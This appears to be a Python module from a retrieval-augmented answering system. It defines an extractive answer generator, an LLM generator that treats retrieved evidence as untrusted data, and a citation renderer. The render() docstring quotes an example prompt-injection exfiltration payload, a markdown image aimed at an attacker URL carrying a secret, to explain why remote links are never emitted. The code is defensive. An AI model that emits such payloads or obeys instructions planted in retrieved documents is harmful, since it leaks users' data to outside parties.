"""Producing an answer from assembled evidence.

Two implementations behind one Protocol:

* ``ExtractiveAnswerGenerator`` composes the answer from verbatim evidence sentences. It is the
  CI and offline default, and its defining property is that **it cannot invent anything** -- every
  sentence it emits is copied from a block, so citation accuracy is 1.0 by construction. That
  makes it the control arm: a metric that moves between extractive and LLM generation is a
  property of the model, not of the pipeline.
* ``LLMAnswerGenerator`` asks a model for structured output and is what ships.

Both return the same ``Answer``, and both are subject to the same verification afterwards. The
generator is never trusted -- it is a proposal that ``verify.py`` accepts or rejects.
"""

from __future__ import annotations

import re
from collections.abc import Sequence
from typing import Any, Protocol, runtime_checkable

from app.answer.assemble import AssembledContext, EvidenceBlock
from app.answer.types import Answer, AnswerSentence
from app.utils.text import split_sentences, tokens

#: Words that carry no topical signal when scoring a sentence against a question.
_STOPWORDS: frozenset[str] = frozenset(
    {
        "the",
        "a",
        "an",
        "of",
        "in",
        "on",
        "at",
        "to",
        "for",
        "from",
        "by",
        "with",
        "and",
        "or",
        "is",
        "are",
        "was",
        "were",
        "be",
        "been",
        "may",
        "must",
        "will",
        "shall",
        "can",
        "that",
        "this",
        "these",
        "those",
        "it",
        "its",
        "as",
        "if",
        "not",
        "no",
        "any",
        "all",
        "which",
        "what",
        "when",
        "where",
        "who",
        "how",
        "why",
        "do",
        "does",
        "did",
        "have",
        "has",
        "had",
    }
)


@runtime_checkable
class AnswerGenerator(Protocol):
    name: str

    async def generate(self, question: str, context: AssembledContext, *, strict: bool = False) -> Answer: ...


class ExtractiveAnswerGenerator:
    """Selects the evidence sentences that best answer the question, verbatim.

    Not a good product experience -- the prose is stitched rather than written. That is the
    point: it is a floor that cannot hallucinate, so every metric it produces is attributable to
    retrieval and assembly rather than to a model's willingness to fill gaps.
    """

    name = "extractive"

    def __init__(self, max_sentences: int = 3, min_overlap: int = 1) -> None:
        self.max_sentences = max_sentences
        self.min_overlap = min_overlap

    async def generate(self, question: str, context: AssembledContext, *, strict: bool = False) -> Answer:
        query_terms = {term for term in tokens(question) if term not in _STOPWORDS}
        if not context.blocks:
            raise ValueError("ExtractiveAnswerGenerator requires assembled evidence")

        scored: list[tuple[float, str, EvidenceBlock]] = []
        for block in context.blocks:
            for sentence in split_sentences(block.text):
                overlap = _overlap(sentence, query_terms)
                if overlap < self.min_overlap:
                    continue
                # Favour sentences that answer rather than merely mention: a number or a modal
                # verb is what distinguishes "the rate is 120 EUR" from "rates are reviewed".
                bonus = 0.5 if _contains_value(sentence) else 0.0
                scored.append((overlap + bonus + block.score, sentence, block))

        if not scored:
            raise ValueError("no evidence sentence overlapped the question")

        scored.sort(key=lambda row: (-row[0], row[1]))
        chosen: list[tuple[str, EvidenceBlock]] = []
        seen: set[str] = set()
        for _, sentence, block in scored:
            normalized = " ".join(sentence.split()).casefold()
            if normalized in seen:
                continue
            seen.add(normalized)
            chosen.append((sentence, block))
            if len(chosen) >= (1 if strict else self.max_sentences):
                break

        return Answer(
            answerable=True,
            sentences=tuple(AnswerSentence(text=sentence, evidence_ids=(block.id,)) for sentence, block in chosen),
            caveats=_superseded_caveat(block for _, block in chosen),
        )


def _overlap(sentence: str, query_terms: set[str]) -> float:
    sentence_terms = {term for term in tokens(sentence) if term not in _STOPWORDS}
    if not sentence_terms:
        return 0.0
    return float(len(query_terms & sentence_terms))


_VALUE_RE = re.compile(r"\d")


def _contains_value(sentence: str) -> bool:
    return bool(_VALUE_RE.search(sentence))


def _superseded_caveat(blocks: Any) -> tuple[str, ...]:
    if any(block.is_superseded for block in blocks):
        return ("Some of the sources quoted have been superseded; check the effective dates.",)
    return ()


class LLMAnswerGenerator:
    """Asks a model for structured output over the assembled evidence.

    Three prompt properties matter more than wording:

    * evidence is **labelled as untrusted data**, so an instruction inside an ingested document
      is content to report rather than a directive to follow;
    * every claim sentence must carry an evidence id, and the schema enforces it;
    * "not in the sources" is an explicitly allowed, named outcome -- a model given no way to
      say it will produce something rather than nothing.

    ``strict`` is the single retry after verification fails: it narrows the evidence to what
    survived and tightens the instruction. Exactly one retry, because a second is how a latency
    budget dies for an answer that was already unlikely.
    """

    name = "llm"

    def __init__(self, provider: Any, *, prompt_version: str = "answer-1") -> None:
        self.provider = provider
        self.prompt_version = prompt_version

    async def generate(self, question: str, context: AssembledContext, *, strict: bool = False) -> Answer:
        payload = await self.provider.structured_answer(
            question=question,
            evidence=context.render(),
            allowed_ids=list(context.ids),
            strict=strict,
            prompt_version=self.prompt_version,
        )
        return _from_payload(payload, context)


def _from_payload(payload: dict[str, Any], context: AssembledContext) -> Answer:
    """Parse and defend against a model that ignored the schema.

    Unknown ids are dropped rather than trusted: a fabricated citation that reaches the renderer
    becomes a broken link in the UI, and one that reaches verification wastes a retry. A claim
    left with no valid id is downgraded to a connective rather than discarded, so the
    verification stage sees it and can reject the whole answer.
    """
    valid = set(context.ids)
    sentences: list[AnswerSentence] = []

    for raw in payload.get("sentences", []):
        text = str(raw.get("text", "")).strip()
        if not text:
            continue
        ids = tuple(str(i) for i in raw.get("evidence_ids", ()) if str(i) in valid)
        kind = raw.get("kind", "claim")
        if kind == "claim" and not ids:
            kind = "connective"
        sentences.append(AnswerSentence(text=text, evidence_ids=ids, kind=kind))

    if not payload.get("answerable", False) or not sentences:
        from app.answer.abstain import abstain
        from app.answer.types import AbstentionReason

        return abstain(AbstentionReason.UNGROUNDED_DRAFT)

    return Answer(
        answerable=True,
        sentences=tuple(sentences),
        caveats=tuple(str(item) for item in payload.get("caveats", ())),
    )


def render(answer: Answer) -> str:
    """The answer as prose with citation markers.

    Markdown links and images are deliberately absent. ``![](https://attacker/?d=secret)`` is the
    classic exfiltration channel for prompt injection through an ingested document, so the
    renderer emits footnote-style markers that resolve client-side and never a remote URL.
    """
    if not answer.answerable:
        return answer.message

    parts: list[str] = []
    for sentence in answer.sentences:
        markers = "".join(f"[^{evidence_id}]" for evidence_id in sentence.evidence_ids)
        parts.append(f"{sentence.text}{markers}")

    rendered = " ".join(parts)
    if answer.caveats:
        rendered += "\n\n" + "\n".join(f"Note: {caveat}" for caveat in answer.caveats)
    return rendered


def sentences_for_display(answer: Answer) -> Sequence[dict[str, Any]]:
    return [
        {"text": sentence.text, "evidence_ids": list(sentence.evidence_ids), "kind": sentence.kind}
        for sentence in answer.sentences
    ]
